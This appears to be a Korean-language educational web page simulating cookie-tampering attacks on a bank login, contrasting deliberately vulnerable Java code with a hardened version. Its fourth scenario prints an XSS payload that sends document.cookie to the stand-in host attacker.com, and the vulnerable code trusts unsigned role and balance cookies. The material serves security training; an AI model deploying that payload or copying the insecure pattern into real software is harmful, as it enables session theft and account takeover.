@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>금융권 쿠키 변조 취약점 시뮬레이터</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
+        body { font-family: 'Noto Sans KR', sans-serif; }
+        .code-font { font-family: 'Courier New', monospace; }
+    </style>
+</head>
+<body class="bg-gray-100 p-4">
+
+    <!-- 평가기준 배너 -->
+    <div class="max-w-7xl mx-auto mb-4">
+        <div class="bg-red-600 text-white p-4 rounded-lg shadow-lg">
+            <div class="flex items-center gap-3">
+                <i class="fas fa-clipboard-check text-2xl"></i>
+                <div>
+                    <h1 class="font-bold text-lg">전자금융기반시설 보안 취약점 평가기준 - WEB-SER-047</h1>
+                    <p class="text-sm">쿠키 변조 (CC) | 위험도: 3 (중간) | 통제구분: 5.2.5 쿠키 보안</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 메인 컨텐츠 -->
+    <div class="max-w-7xl mx-auto">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+            
+            <!-- 좌측: 취약한 시스템 -->
+            <div class="space-y-4">
+                
+                <!-- 은행 헤더 -->
+                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex items-center gap-3">
+                        <i class="fas fa-building-columns text-2xl"></i>
+                        <div>
+                            <h2 class="text-xl font-bold">기업은행</h2>
+                            <p class="text-sm">인터넷뱅킹 사용자 인증</p>
+                        </div>
+                    </div>
+                    <div class="mt-2 bg-red-500 px-3 py-1 rounded text-sm">
+                        <i class="fas fa-exclamation-triangle"></i> 취약점: 쿠키 검증 미흡
+                    </div>
+                </div>
+
+                <!-- 로그인 후 화면 -->
+                <div class="bg-white p-5 rounded-lg shadow-lg">
+                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
+                        <i class="fas fa-user-circle text-blue-600"></i>
+                        사용자 정보
+                    </h3>
+                    
+                    <div class="bg-blue-50 border-l-4 border-blue-500 p-3 mb-3">
+                        <p class="text-sm mb-1"><strong>이름:</strong> <span id="userName">홍길동</span></p>
+                        <p class="text-sm mb-1"><strong>등급:</strong> <span id="userRole">일반회원</span></p>
+                        <p class="text-sm"><strong>잔액:</strong> <span id="userBalance">1,234,000원</span></p>
+                    </div>
+
+                    <div class="bg-gray-100 p-3 rounded mb-3">
+                        <p class="text-xs font-bold mb-2">브라우저 쿠키:</p>
+                        <div id="cookieDisplay" class="code-font text-xs bg-white p-2 rounded border">
+                            <div>userId=<span class="text-blue-600">user001</span></div>
+                            <div>role=<span class="text-blue-600">user</span></div>
+                            <div>balance=<span class="text-blue-600">1234000</span></div>
+                        </div>
+                    </div>
+
+                    <button onclick="resetCookie()" 
+                            class="w-full bg-gray-500 hover:bg-gray-600 text-white py-2 rounded text-sm">
+                        <i class="fas fa-redo"></i> 쿠키 초기화
+                    </button>
+                </div>
+
+                <!-- 쿠키 변조 도구 -->
+                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-wrench text-yellow-400"></i>
+                        쿠키 변조 도구
+                    </h3>
+                    
+                    <label class="block text-sm mb-2">role 쿠키 값:</label>
+                    <select id="roleSelect" class="w-full p-2 rounded text-gray-900 mb-2">
+                        <option value="user">user (일반회원)</option>
+                        <option value="vip">vip (VIP회원)</option>
+                        <option value="admin">admin (관리자)</option>
+                    </select>
+
+                    <label class="block text-sm mb-2">balance 쿠키 값:</label>
+                    <input type="number" id="balanceInput" 
+                           class="w-full p-2 rounded text-gray-900 mb-3" 
+                           value="1234000">
+
+                    <button onclick="modifyCookie()" 
+                            class="w-full bg-red-600 hover:bg-red-700 text-white py-2 rounded">
+                        <i class="fas fa-edit"></i> 쿠키 변조 실행
+                    </button>
+                </div>
+
+                <!-- 공격 시나리오 버튼 -->
+                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-flask text-red-400"></i>
+                        공격 시나리오
+                    </h3>
+                    <div class="space-y-2">
+                        <button onclick="attackScenario(1)" 
+                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-crown"></i> 시나리오 1: 권한 상승 (user → admin)
+                        </button>
+                        <button onclick="attackScenario(2)" 
+                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-money-bill-wave"></i> 시나리오 2: 잔액 조작
+                        </button>
+                        <button onclick="attackScenario(3)" 
+                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-id-card"></i> 시나리오 3: 타인 ID 사칭
+                        </button>
+                        <button onclick="attackScenario(4)" 
+                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
+                            <i class="fas fa-laptop-code"></i> 시나리오 4: XSS로 쿠키 탈취
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 취약한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-red-400">
+                            <i class="fas fa-skull-crossbones"></i> 취약한 Java 코드
+                        </h3>
+                        <span class="text-xs bg-red-600 px-2 py-1 rounded">위험</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// ❌ 쿠키 검증 없이 신뢰</span>
+@GetMapping("/mypage")
+public String mypage(HttpServletRequest request) {
+    
+    <span class="text-red-400">// 쿠키 값을 그대로 신뢰!</span>
+    Cookie[] cookies = request.getCookies();
+    String userId = getCookieValue(cookies, "userId");
+    String role = getCookieValue(cookies, "role");
+    int balance = Integer.parseInt(
+        getCookieValue(cookies, "balance")
+    );
+    
+    <span class="text-red-400">// 서버 검증 없이 권한 판단!</span>
+    if ("admin".equals(role)) {
+        return "adminPage";  // 관리자 페이지
+    }
+    
+    <span class="text-red-400">// 쿠키의 잔액을 그대로 표시!</span>
+    model.addAttribute("balance", balance);
+    
+    return "mypage";
+}
+
+<span class="text-gray-500">// 쿠키 생성 시 서명 없음</span>
+@PostMapping("/login")
+public String login(String userId, String password) {
+    
+    User user = authenticate(userId, password);
+    
+    <span class="text-red-400">// 평문 쿠키 생성 (서명 없음!)</span>
+    Cookie userIdCookie = new Cookie("userId", userId);
+    Cookie roleCookie = new Cookie("role", user.getRole());
+    Cookie balanceCookie = new Cookie("balance", 
+        String.valueOf(user.getBalance()));
+    
+    <span class="text-red-400">// HttpOnly 미설정!</span>
+    response.addCookie(userIdCookie);
+    response.addCookie(roleCookie);
+    response.addCookie(balanceCookie);
+    
+    return "redirect:/mypage";
+}</code></pre>
+                </div>
+
+            </div>
+
+            <!-- 우측: 결과 및 안전한 코드 -->
+            <div class="space-y-4">
+                
+                <!-- 공격 실행 결과 -->
+                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
+                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
+                        <h3 class="font-bold">
+                            <i class="fas fa-terminal"></i> 공격 실행 결과
+                        </h3>
+                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded">
+                            대기중
+                        </span>
+                    </div>
+                    <div id="attackResult" class="p-5 min-h-[300px] bg-white">
+                        <div class="text-center text-gray-400 py-10">
+                            <i class="fas fa-cookie-bite text-5xl mb-3 opacity-30"></i>
+                            <p class="text-sm">공격 시나리오를 선택하세요</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 공격 단계 -->
+                <div id="attackStages" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
+                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
+                        <i class="fas fa-list-ol"></i> 공격 진행 단계
+                    </h4>
+                    <div id="stagesContent" class="text-sm text-red-700 space-y-1"></div>
+                </div>
+
+                <!-- 터미널 출력 -->
+                <div id="terminalBox" class="hidden bg-black text-green-400 p-4 rounded-lg shadow-lg">
+                    <div class="font-bold mb-2 text-xs">
+                        <i class="fas fa-terminal"></i> ATTACKER CONSOLE
+                    </div>
+                    <div id="terminalLines" class="code-font text-xs space-y-1 max-h-[200px] overflow-y-auto"></div>
+                </div>
+
+                <!-- 안전한 코드 -->
+                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
+                    <div class="flex justify-between items-center mb-3">
+                        <h3 class="font-bold text-green-400">
+                            <i class="fas fa-shield-halved"></i> 안전한 Java 코드
+                        </h3>
+                        <span class="text-xs bg-green-600 px-2 py-1 rounded">권장</span>
+                    </div>
+                    <pre class="code-font text-xs overflow-x-auto max-h-[350px]"><code><span class="text-green-400">// ✅ 안전한 쿠키 관리</span>
+
+<span class="text-gray-500">// 1. 서명된 쿠키 생성 (HMAC)</span>
+@PostMapping("/login")
+public String login(String userId, String password,
+                   HttpServletResponse response) {
+    
+    User user = authenticate(userId, password);
+    
+    <span class="text-green-400">// 세션에 저장 (쿠키에 민감정보 X)</span>
+    session.setAttribute("userId", userId);
+    session.setAttribute("user", user);
+    
+    <span class="text-green-400">// 세션 ID만 쿠키로 전송</span>
+    Cookie sessionCookie = new Cookie(
+        "JSESSIONID", 
+        session.getId()
+    );
+    
+    <span class="text-green-400">// HttpOnly 설정 (XSS 방어)</span>
+    sessionCookie.setHttpOnly(true);
+    
+    <span class="text-green-400">// Secure 설정 (HTTPS만)</span>
+    sessionCookie.setSecure(true);
+    
+    <span class="text-green-400">// SameSite 설정 (CSRF 방어)</span>
+    response.setHeader("Set-Cookie", 
+        String.format(
+            "JSESSIONID=%s; HttpOnly; Secure; SameSite=Strict",
+            session.getId()
+        )
+    );
+    
+    return "redirect:/mypage";
+}
+
+<span class="text-gray-500">// 2. 서버에서 세션 검증</span>
+@GetMapping("/mypage")
+public String mypage(HttpSession session, Model model) {
+    
+    <span class="text-green-400">// 세션에서 사용자 정보 조회</span>
+    User user = (User) session.getAttribute("user");
+    
+    if (user == null) {
+        return "redirect:/login";
+    }
+    
+    <span class="text-green-400">// DB에서 실시간 정보 조회</span>
+    User currentUser = userService.findById(user.getId());
+    
+    <span class="text-green-400">// 서버에서 권한 확인</span>
+    if (currentUser.getRole().equals("ADMIN")) {
+        model.addAttribute("isAdmin", true);
+    }
+    
+    <span class="text-green-400">// DB에서 조회한 잔액 표시</span>
+    model.addAttribute("balance", currentUser.getBalance());
+    
+    return "mypage";
+}
+
+<span class="text-gray-500">// 3. 쿠키에 민감정보 필요 시 HMAC 서명</span>
+public String createSignedCookie(String value) {
+    
+    <span class="text-green-400">// HMAC-SHA256으로 서명 생성</span>
+    String secret = "your-secret-key-256bit";
+    Mac sha256_HMAC = Mac.getInstance("HmacSHA256");
+    SecretKeySpec secretKey = 
+        new SecretKeySpec(secret.getBytes(), "HmacSHA256");
+    sha256_HMAC.init(secretKey);
+    
+    byte[] hash = sha256_HMAC.doFinal(value.getBytes());
+    String signature = Base64.getEncoder()
+        .encodeToString(hash);
+    
+    <span class="text-green-400">// value + signature 결합</span>
+    return value + "." + signature;
+}
+
+<span class="text-gray-500">// 4. 서명 검증</span>
+public boolean verifyCookie(String signedValue) {
+    
+    String[] parts = signedValue.split("\\.");
+    if (parts.length != 2) {
+        return false;
+    }
+    
+    String value = parts[0];
+    String receivedSignature = parts[1];
+    
+    <span class="text-green-400">// 서명 재생성</span>
+    String expectedSignedValue = createSignedCookie(value);
+    String expectedSignature = 
+        expectedSignedValue.split("\\.")[1];
+    
+    <span class="text-green-400">// 서명 일치 확인</span>
+    return receivedSignature.equals(expectedSignature);
+}
+
+<span class="text-gray-500">// 5. Spring Boot 쿠키 보안 설정</span>
+@Bean
+public ServletContextInitializer servletContextInit() {
+    return ctx -> {
+        SessionCookieConfig config = 
+            ctx.getSessionCookieConfig();
+        config.setHttpOnly(true);
+        config.setSecure(true);
+        config.setName("SESSIONID");
+        config.setMaxAge(3600); // 1시간
+        config.setAttribute("SameSite", "Strict");
+    };
+}</code></pre>
+                </div>
+
+                <!-- 방어 체크리스트 -->
+                <div class="bg-white p-4 rounded-lg shadow-lg">
+                    <h3 class="font-bold mb-3 flex items-center gap-2">
+                        <i class="fas fa-list-check text-red-600"></i>
+                        쿠키 보안 체크리스트
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>HttpOnly:</strong> JavaScript 접근 차단</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>Secure:</strong> HTTPS에서만 전송</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>SameSite:</strong> CSRF 공격 방어</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>서명/암호화:</strong> HMAC으로 무결성 보장</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>세션 사용:</strong> 민감정보는 서버에 저장</div>
+                        </div>
+                        <div class="flex items-start gap-2">
+                            <i class="fas fa-check text-green-500 mt-1"></i>
+                            <div><strong>서버 검증:</strong> 쿠키 값 절대 신뢰 금지</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 평가 판정 -->
+                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
+                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
+                        <i class="fas fa-gavel"></i> 평가 판정
+                    </h3>
+                    <div class="text-xs space-y-1">
+                        <div><strong>평가항목:</strong> WEB-SER-047 쿠키 변조</div>
+                        <div><strong>판정:</strong> <span id="judgement" class="text-red-400">취약</span></div>
+                        <div><strong>근거:</strong> <span id="evidence"></span></div>
+                    </div>
+                </div>
+
+                <!-- 피해 시나리오 -->
+                <div id="damageBox" class="hidden bg-red-700 text-white p-4 rounded-lg">
+                    <h3 class="font-bold mb-3">
+                        <i class="fas fa-fire"></i> 실제 피해 사례
+                    </h3>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex gap-2">
+                            <span class="font-bold">1.</span>
+                            <div><strong>권한 상승</strong><br>일반 사용자 → 관리자 권한</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">2.</span>
+                            <div><strong>가격 조작</strong><br>상품 가격 쿠키 변조</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">3.</span>
+                            <div><strong>신원 사칭</strong><br>타인 ID 쿠키로 로그인</div>
+                        </div>
+                        <div class="flex gap-2">
+                            <span class="font-bold">4.</span>
+                            <div><strong>무료 이용</strong><br>결제 상태 쿠키 조작</div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function resetCookie() {
+            document.getElementById('userName').textContent = '홍길동';
+            document.getElementById('userRole').textContent = '일반회원';
+            document.getElementById('userBalance').textContent = '1,234,000원';
+            
+            document.getElementById('cookieDisplay').innerHTML = 
+                '<div>userId=<span class="text-blue-600">user001</span></div>' +
+                '<div>role=<span class="text-blue-600">user</span></div>' +
+                '<div>balance=<span class="text-blue-600">1234000</span></div>';
+            
+            document.getElementById('roleSelect').value = 'user';
+            document.getElementById('balanceInput').value = '1234000';
+            
+            document.getElementById('attackResult').innerHTML = 
+                '<div class="text-center text-gray-400 py-10">' +
+                '<i class="fas fa-cookie-bite text-5xl mb-3 opacity-30"></i>' +
+                '<p class="text-sm">공격 시나리오를 선택하세요</p></div>';
+            
+            document.getElementById('attackStages').classList.add('hidden');
+            document.getElementById('terminalBox').classList.add('hidden');
+            document.getElementById('judgementBox').classList.add('hidden');
+            document.getElementById('damageBox').classList.add('hidden');
+            document.getElementById('statusBadge').textContent = '대기중';
+            document.getElementById('statusBadge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded';
+        }
+
+        function modifyCookie() {
+            var role = document.getElementById('roleSelect').value;
+            var balance = document.getElementById('balanceInput').value;
+            
+            var roleText = role === 'admin' ? '관리자' : (role === 'vip' ? 'VIP회원' : '일반회원');
+            document.getElementById('userRole').textContent = roleText;
+            document.getElementById('userBalance').textContent = Number(balance).toLocaleString() + '원';
+            
+            document.getElementById('cookieDisplay').innerHTML = 
+                '<div>userId=<span class="text-blue-600">user001</span></div>' +
+                '<div>role=<span class="text-red-600">' + role + '</span> <span class="text-red-500">← 변조됨!</span></div>' +
+                '<div>balance=<span class="text-red-600">' + balance + '</span> <span class="text-red-500">← 변조됨!</span></div>';
+        }
+
+        async function attackScenario(type) {
+            resetCookie();
+            await sleep(200);
+            
+            var result = document.getElementById('attackResult');
+            var badge = document.getElementById('statusBadge');
+            
+            document.getElementById('attackStages').classList.remove('hidden');
+            document.getElementById('terminalBox').classList.remove('hidden');
+            document.getElementById('judgementBox').classList.remove('hidden');
+            document.getElementById('damageBox').classList.remove('hidden');
+            document.getElementById('terminalLines').innerHTML = '';
+            
+            if (type === 1) {
+                // 시나리오 1: 권한 상승
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. 개발자 도구(F12) 열기</div>' +
+                    '<div>2. Application → Cookies 확인</div>' +
+                    '<div>3. role=user → role=admin 변경</div>' +
+                    '<div>4. 페이지 새로고침 → 관리자 권한 획득!</div>';
+                
+                addTerminalLine('> F12 개발자 도구 열기');
+                await sleep(500);
+                addTerminalLine('> Application 탭 → Cookies');
+                await sleep(500);
+                addTerminalLine('> 현재 쿠키:');
+                addTerminalLine('  role=user', 'text-gray-400');
+                await sleep(800);
+                addTerminalLine('> [!] 쿠키 변조 시도...', 'text-yellow-400');
+                await sleep(500);
+                
+                document.getElementById('roleSelect').value = 'admin';
+                modifyCookie();
+                
+                await sleep(500);
+                addTerminalLine('> document.cookie = "role=admin"', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 페이지 새로고침...');
+                await sleep(800);
+                addTerminalLine('> [!] 관리자 권한 획득!', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 권한 상승 성공</h4>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">쿠키 변조 과정:</p>' +
+                    '<table class="w-full text-xs">' +
+                    '<tr class="border-b bg-gray-50"><th class="text-left py-1">단계</th><th class="text-left py-1">Before</th><th class="text-left py-1">After</th></tr>' +
+                    '<tr class="border-b"><td class="py-1">쿠키</td><td class="py-1 code-font">role=user</td><td class="py-1 code-font text-red-600">role=admin</td></tr>' +
+                    '<tr><td class="py-1">권한</td><td class="py-1">일반회원</td><td class="py-1 text-red-600">관리자</td></tr>' +
+                    '</table></div>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">획득한 관리자 권한:</p>' +
+                    '<div class="space-y-1 text-xs">' +
+                    '<div>✓ 모든 사용자 정보 조회</div>' +
+                    '<div>✓ 거래 내역 열람</div>' +
+                    '<div>✓ 시스템 설정 변경</div>' +
+                    '<div>✓ 계좌 잠금/해제</div>' +
+                    '</div></div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">⚠️ 보안 위협</p>' +
+                    '<p>서버 검증 없이 쿠키만으로 권한 판단</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = '쿠키 값 서버 검증 미수행';
+                badge.textContent = '취약';
+                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
+                
+            } else if (type === 2) {
+                // 시나리오 2: 잔액 조작
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. 현재 잔액 쿠키 확인 (1,234,000원)</div>' +
+                    '<div>2. balance 값을 999,999,999로 변경</div>' +
+                    '<div>3. 새로고침 후 조작된 잔액 표시</div>' +
+                    '<div>4. 이체 한도 우회 가능!</div>';
+                
+                addTerminalLine('> 현재 잔액 쿠키: 1234000');
+                await sleep(500);
+                addTerminalLine('> [!] 잔액 조작 시도...', 'text-yellow-400');
+                await sleep(500);
+                
+                document.getElementById('balanceInput').value = '999999999';
+                modifyCookie();
+                
+                await sleep(500);
+                addTerminalLine('> document.cookie = "balance=999999999"', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 새로고침...');
+                await sleep(800);
+                addTerminalLine('> [!] 표시 잔액: 999,999,999원', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 이체 한도 체크 우회 가능', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 잔액 표시 조작</h4>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">쿠키 변조:</p>' +
+                    '<div class="bg-gray-100 p-2 rounded code-font text-xs mb-2">' +
+                    '<div>Before: balance=<span class="text-gray-600">1234000</span></div>' +
+                    '<div>After: balance=<span class="text-red-600">999999999</span></div>' +
+                    '</div></div>' +
+                    '<div class="bg-blue-50 border border-blue-300 p-3 rounded mb-3">' +
+                    '<p class="text-sm font-bold mb-2">표시된 잔액:</p>' +
+                    '<p class="text-2xl font-bold text-red-600">999,999,999원</p>' +
+                    '<p class="text-xs text-gray-600 mt-1">실제 DB 잔액: 1,234,000원</p>' +
+                    '</div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">⚠️ 가능한 공격</p>' +
+                    '<p>• 이체 한도 체크 우회</p>' +
+                    '<p>• UI 기반 제한 무시</p>' +
+                    '<p>• 사용자 혼란 유도</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = '쿠키 잔액 신뢰';
+                badge.textContent = '취약';
+                badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded';
+                
+            } else if (type === 3) {
+                // 시나리오 3: 타인 ID 사칭
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. 공격 대상 ID 파악 (admin, vip001 등)</div>' +
+                    '<div>2. userId 쿠키를 타인 ID로 변경</div>' +
+                    '<div>3. 서버가 쿠키만 확인</div>' +
+                    '<div>4. 타인 계좌 접근 성공!</div>';
+                
+                addTerminalLine('> 공격 대상 ID 리스트:');
+                await sleep(500);
+                addTerminalLine('  - admin (관리자)', 'text-yellow-400');
+                addTerminalLine('  - vip001 (VIP 고객)', 'text-yellow-400');
+                addTerminalLine('  - ceo (임원)', 'text-yellow-400');
+                await sleep(800);
+                addTerminalLine('> [!] userId 쿠키 변조...', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> document.cookie = "userId=admin"');
+                await sleep(500);
+                
+                document.getElementById('cookieDisplay').innerHTML = 
+                    '<div>userId=<span class="text-red-600">admin</span> <span class="text-red-500">← 변조!</span></div>' +
+                    '<div>role=<span class="text-blue-600">user</span></div>' +
+                    '<div>balance=<span class="text-blue-600">1234000</span></div>';
+                
+                document.getElementById('userName').textContent = '관리자 (사칭)';
+                
+                await sleep(800);
+                addTerminalLine('> [!] 관리자 계정 접근!', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 민감 정보 조회 가능', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 신원 사칭 성공</h4>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">사칭 대상 계정:</p>' +
+                    '<div class="bg-gray-100 p-2 rounded text-sm">' +
+                    '<p><strong>ID:</strong> admin</p>' +
+                    '<p><strong>이름:</strong> 시스템 관리자</p>' +
+                    '<p><strong>권한:</strong> 전체 시스템 접근</p>' +
+                    '</div></div>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">접근 가능한 정보:</p>' +
+                    '<div class="space-y-1 text-xs">' +
+                    '<div>✓ 전체 고객 목록</div>' +
+                    '<div>✓ 거래 내역 (125,847건)</div>' +
+                    '<div>✓ 개인정보 (주민번호 포함)</div>' +
+                    '<div>✓ 시스템 로그</div>' +
+                    '</div></div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">💀 치명적 피해</p>' +
+                    '<p>타인 계정 완전 장악</p>' +
+                    '<p>개인정보 대량 유출 가능</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = 'userId 쿠키만으로 인증';
+                badge.textContent = '치명적';
+                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
+                
+            } else if (type === 4) {
+                // 시나리오 4: XSS로 쿠키 탈취
+                document.getElementById('stagesContent').innerHTML = 
+                    '<div>1. XSS 취약점 발견</div>' +
+                    '<div>2. document.cookie로 쿠키 탈취</div>' +
+                    '<div>3. 공격자 서버로 전송</div>' +
+                    '<div>4. 공격자가 쿠키 재사용!</div>';
+                
+                addTerminalLine('> XSS 취약점 탐색...');
+                await sleep(500);
+                addTerminalLine('> [발견] 게시판 검색 기능');
+                await sleep(500);
+                addTerminalLine('> 악성 스크립트 삽입:', 'text-yellow-400');
+                await sleep(300);
+                addTerminalLine('<script>fetch("http://attacker.com/steal",{', 'text-red-400');
+                addTerminalLine('  body: document.cookie', 'text-red-400');
+                addTerminalLine('})</script>', 'text-red-400');
+                await sleep(1000);
+                addTerminalLine('> [!] 피해자 쿠키 탈취!', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> userId=user001', 'text-red-400');
+                addTerminalLine('> role=user', 'text-red-400');
+                addTerminalLine('> balance=1234000', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> JSESSIONID=ABC123...', 'text-red-400');
+                await sleep(800);
+                addTerminalLine('> [!] 공격자가 쿠키 재사용', 'text-red-400');
+                await sleep(500);
+                addTerminalLine('> 피해자 계정 접근 성공', 'text-red-400');
+                
+                result.innerHTML = 
+                    '<div class="bg-red-50 border-l-4 border-red-500 p-4">' +
+                    '<h4 class="font-bold text-red-700 mb-3">🚨 XSS + 쿠키 탈취</h4>' +
+                    '<div class="bg-gray-900 text-green-400 p-3 rounded mb-3 code-font text-xs">' +
+                    '<div class="text-white">// XSS 공격 코드</div>' +
+                    '<div>&lt;script&gt;</div>' +
+                    '<div class="ml-2">var cookie = document.cookie;</div>' +
+                    '<div class="ml-2 text-red-400">fetch(\'http://attacker.com/steal\', {</div>' +
+                    '<div class="ml-4 text-red-400">method: \'POST\',</div>' +
+                    '<div class="ml-4 text-red-400">body: cookie</div>' +
+                    '<div class="ml-2 text-red-400">});</div>' +
+                    '<div>&lt;/script&gt;</div>' +
+                    '<div class="mt-2 text-yellow-400">// 공격자 서버 로그:</div>' +
+                    '<div class="text-red-400">userId=user001; role=user; ...</div>' +
+                    '</div>' +
+                    '<div class="bg-white p-3 rounded mb-3 border">' +
+                    '<p class="text-sm font-bold mb-2">⚠️ HttpOnly 미설정 시:</p>' +
+                    '<div class="space-y-1 text-xs">' +
+                    '<div>• JavaScript로 쿠키 접근 가능</div>' +
+                    '<div>• XSS로 쿠키 탈취 가능</div>' +
+                    '<div>• 세션 하이재킹 위험</div>' +
+                    '</div></div>' +
+                    '<div class="bg-red-900 text-red-100 p-3 rounded text-sm">' +
+                    '<p class="font-bold">🔒 방어 방법</p>' +
+                    '<p>HttpOnly: true 설정 필수!</p>' +
+                    '<p>→ document.cookie 접근 차단</p>' +
+                    '</div></div>';
+                
+                document.getElementById('evidence').textContent = 'HttpOnly 쿠키 미사용';
+                badge.textContent = '치명적';
+                badge.className = 'text-xs bg-red-600 text-white px-3 py-1 rounded';
+            }
+        }
+
+        function addTerminalLine(text, color) {
+            var div = document.createElement('div');
+            div.className = color || 'text-green-400';
+            div.textContent = text;
+            document.getElementById('terminalLines').appendChild(div);
+            document.getElementById('terminalLines').scrollTop = 
+                document.getElementById('terminalLines').scrollHeight;
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+    </script>
+</body>
+</html>
